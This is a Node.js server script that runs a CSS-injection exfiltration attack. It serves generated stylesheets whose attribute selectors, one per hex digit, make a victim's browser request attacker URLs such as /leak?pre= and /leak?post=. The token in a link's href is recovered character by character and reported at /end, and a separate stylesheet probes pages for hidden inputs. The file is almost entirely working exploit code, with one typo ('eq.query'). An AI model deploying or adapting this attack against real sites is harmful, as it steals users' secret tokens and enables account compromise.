const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const DEBUG = false;

var selector = "a.dropdown-item", attribute = "href", prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0, hiddenInputs = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/log":
            if(eq.query.hi) {
                hiddenInputs++;
            }
        break
        case "/discover":
            discoverResponse(response)
            break;
        case "/start":
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && prefix !== req.query.pre) {
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            console.log('[+] END: %s', req.query.token);
        default:
            response.end();
    }
}

const discoverResponse = (response) => {
    let css = `
        input[type="hidden"]::after {
            content: "";
            background:url(/log?hi=1);   
        }
    `;
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
};

const genResponse = (response) => {
    const hex = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'];
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
        hex.map(e => (selector + '['+attribute+'$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + encodeURIComponent(postfix) + ');}')).join('') +
        hex.map(e => (selector + '['+attribute+'^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + encodeURIComponent(prefix) + e +');}')).join('');
        if(n === 0) {
            let properties = [];
            for(let i=0;i<32;i++) {      
                  properties.push('var(--e'+i+',none),var(--s'+i+',none),var(--full-token,none)');
            }
            css += `${selector}{background:${properties.join(',')};}`;
         }
    css += selector + '['+attribute+'="'+ prefix + postfix + '"]{--full-token:url(' + HOSTNAME + '/end?token=' + encodeURIComponent(prefix) + encodeURIComponent(postfix) + ');}';
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}